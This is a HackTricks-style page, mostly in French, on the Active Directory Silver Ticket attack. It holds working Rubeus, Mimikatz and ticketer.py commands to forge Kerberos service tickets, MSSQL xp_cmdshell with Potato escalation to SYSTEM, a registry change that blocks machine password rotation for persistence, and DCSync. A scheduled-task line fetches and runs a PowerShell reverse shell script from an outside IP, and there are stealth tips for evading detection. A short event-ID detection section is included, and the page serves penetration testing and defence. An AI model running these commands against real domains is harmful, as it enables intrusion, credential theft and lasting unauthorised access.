# Silver Ticket

{{#include ../../banners/hacktricks-training.md}}



## Silver ticket

L'attaque **Silver Ticket** consiste à exploiter des service tickets dans des environnements Active Directory (AD). Cette méthode repose sur **l'obtention du NTLM hash d'un service account**, par exemple d'un computer account, pour forger un Ticket Granting Service (TGS) ticket. Avec ce ticket forgé, un attaquant peut accéder à des services spécifiques du réseau en **usurpant n'importe quel utilisateur**, visant typiquement des privilèges administratifs. Il est souligné que l'utilisation de AES keys pour forger les tickets est plus sûre et moins détectable.

> [!WARNING]
> Les Silver Tickets sont moins détectables que les Golden Tickets car ils ne nécessitent que le **hash du service account**, pas le compte krbtgt. Cependant, ils sont limités au service spécifique qu'ils ciblent. De plus, il suffit parfois de voler le mot de passe d'un utilisateur. Si vous compromettez le mot de passe d'un **account avec un SPN**, vous pouvez utiliser ce mot de passe pour créer un Silver Ticket usurpant n'importe quel utilisateur auprès de ce service.

### Modern Kerberos changes (AES-only domains)

- Windows updates starting **8 Nov 2022 (KB5021131)** default service tickets to **AES session keys** when possible and are phasing out RC4. DCs are expected to ship with RC4 **disabled by default by mid‑2026**, so relying on NTLM/RC4 hashes for silver tickets increasingly fails with `KRB_AP_ERR_MODIFIED`. Always extract **AES keys** (`aes256-cts-hmac-sha1-96` / `aes128-cts-hmac-sha1-96`) for the target service account.
- If the service account `msDS-SupportedEncryptionTypes` is restricted to AES, you must forge with `/aes256` or `-aesKey`; RC4 (`/rc4` or `-nthash`) will not work even if you hold the NTLM hash.
- gMSA/computer accounts rotate every 30 days; dump the **current AES key** from LSASS, Secretsdump/NTDS, or DCsync before forging.
- OPSEC: default ticket lifetime in tools is often **10 years**; set realistic durations (e.g., `-duration 600` minutes) to avoid detection by abnormal lifetimes.

For ticket crafting, different tools are employed based on the operating system:

### Sous Linux
```bash
# Forge with AES instead of RC4 (supports gMSA/machine accounts)
python ticketer.py -aesKey <AES256_HEX> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn <SERVICE_PRINCIPAL_NAME> <USER>
# or read key directly from a keytab (useful when only keytab is obtained)
python ticketer.py -keytab service.keytab -spn <SPN> -domain <DOMAIN> -domain-sid <DOMAIN_SID> <USER>

# shorten validity for stealth
python ticketer.py -aesKey <AES256_HEX> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn cifs/<HOST_FQDN> -duration 480 <USER>

export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```
### Sur Windows
```bash
# Using Rubeus to request a service ticket and inject (works when you already have a TGT)
# /ldap option is used to get domain data automatically
rubeus.exe asktgs /user:<USER> [/aes256:<HASH> /aes128:<HASH> /rc4:<HASH>] \
/domain:<DOMAIN> /ldap /service:cifs/<TARGET_FQDN> /ptt /nowrap /printcmd

# Forging the ticket directly with Mimikatz (silver ticket => /service + /target)
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> \
/aes256:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET> /ptt"
# RC4 still works only if the DC and service accept RC4
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> \
/rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET> /ptt"

# Inject an already forged kirbi
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```
Le service CIFS est mis en avant comme cible fréquente pour accéder au système de fichiers de la victime, mais d'autres services comme HOST et RPCSS peuvent également être exploités pour les tâches et les requêtes WMI.

### Exemple : MSSQL service (MSSQLSvc) + Potato to SYSTEM

Si vous possédez le hash NTLM (ou la clé AES) d'un compte de service SQL (p. ex., sqlsvc), vous pouvez forger un TGS pour le SPN MSSQL et vous faire passer pour n'importe quel utilisateur auprès du service SQL. À partir de là, activez xp_cmdshell pour exécuter des commandes en tant que le compte de service SQL. Si ce jeton possède SeImpersonatePrivilege, enchaînez un Potato pour élever au niveau SYSTEM.
```bash
# Forge a silver ticket for MSSQLSvc (AES example)
python ticketer.py -aesKey <SQLSVC_AES256> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn MSSQLSvc/<host.fqdn>:1433 administrator
export KRB5CCNAME=$PWD/administrator.ccache

# Connect to SQL using Kerberos and run commands via xp_cmdshell
impacket-mssqlclient -k -no-pass <DOMAIN>/administrator@<host.fqdn>:1433 \
-q "EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami'"
```
- Si le contexte résultant dispose de SeImpersonatePrivilege (souvent le cas pour les service accounts), utilisez une variante de Potato pour obtenir SYSTEM :
```bash
# On the target host (via xp_cmdshell or interactive), run e.g. PrintSpoofer/GodPotato
PrintSpoofer.exe -c "cmd /c whoami"
# or
GodPotato -cmd "cmd /c whoami"
```
Plus de détails sur l'abus de MSSQL et l'activation de xp_cmdshell :

{{#ref}}
abusing-ad-mssql.md
{{#endref}}

Aperçu des techniques Potato :

{{#ref}}
../windows-local-privilege-escalation/roguepotato-and-printspoofer.md
{{#endref}}

## Services disponibles

| Type de service                            | Service Silver Tickets                                                     |
| ------------------------------------------ | -------------------------------------------------------------------------- |
| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>Selon l'OS, également :</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                      | <p>HOST</p><p>HTTP</p><p>Dans certains cas, vous pouvez simplement demander : WINRM</p> |
| Scheduled Tasks                            | HOST                                                                       |
| Windows File Share, also psexec            | CIFS                                                                       |
| LDAP operations, included DCSync           | LDAP                                                                       |
| Windows Remote Server Administration Tools | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
| Golden Tickets                             | krbtgt                                                                     |

Avec **Rubeus**, vous pouvez **demander tous** ces tickets en utilisant le paramètre :

- `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### Event IDs des Silver tickets

- 4624 : Connexion de compte
- 4634 : Déconnexion de compte
- 4672 : Connexion d'administrateur
- **Aucun 4768/4769 précédent sur le DC** pour le même client/service est un indicateur courant qu'un TGS forgé est présenté directement au service.
- Une durée de vie du ticket anormalement longue ou un type de chiffrement inattendu (RC4 alors que le domaine impose AES) ressortent également dans les données 4769/4624.

## Persistance

Pour éviter que les machines ne fassent pivoter leur mot de passe tous les 30 jours, définissez `HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1` ou vous pouvez définir `HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge` sur une valeur supérieure à 30 jours pour indiquer la période de rotation à laquelle le mot de passe de la machine doit être modifié.

## Abus des Service tickets

Dans les exemples suivants, imaginons que le ticket ait été récupéré en usurpant le compte administrateur.

### CIFS

Avec ce ticket, vous pourrez accéder aux dossiers `C$` et `ADMIN$` via **SMB** (s'ils sont exposés) et copier des fichiers vers une partie du système de fichiers distant en faisant quelque chose comme :
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
Vous pourrez également obtenir un shell sur l'hôte ou exécuter des commandes arbitraires en utilisant **psexec**:

{{#ref}}
../lateral-movement/psexec-and-winexec.md
{{#endref}}

### HÔTE

Avec cette permission, vous pouvez créer des tâches planifiées sur des ordinateurs distants et exécuter des commandes arbitraires :
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### HOST + RPCSS

Avec ces tickets, vous pouvez **exécuter WMI sur la machine victime** :
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
Find **more information about wmiexec** in the following page:


{{#ref}}
../lateral-movement/wmiexec.md
{{#endref}}

### HÔTE + WSMAN (WINRM)

Avec un accès winrm à un ordinateur, vous pouvez **y accéder** et même obtenir un PowerShell :
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
Consultez la page suivante pour apprendre **d'autres façons de se connecter à un hôte distant en utilisant winrm**:


{{#ref}}
../lateral-movement/winrm.md
{{#endref}}

> [!WARNING]
> Notez que **winrm doit être actif et à l'écoute** sur l'ordinateur distant pour y accéder.

### LDAP

Avec ce privilège, vous pouvez extraire la base de données du DC en utilisant **DCSync**:
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
**En savoir plus sur DCSync** dans la page suivante :


{{#ref}}
dcsync.md
{{#endref}}


## Références

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027](https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027)
- [HTB Sendai – 0xdf: Silver Ticket + Potato path](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [KB5021131 Kerberos hardening & RC4 deprecation](https://support.microsoft.com/en-us/topic/kb5021131-how-to-manage-the-kerberos-protocol-changes-related-to-cve-2022-37966-fd837ac3-cdec-4e76-a6ec-86e67501407d)
- [Impacket ticketer.py current options (AES/keytab/duration)](https://kb.offsec.nl/tools/framework/impacket/ticketer-py/)



{{#include ../../banners/hacktricks-training.md}}
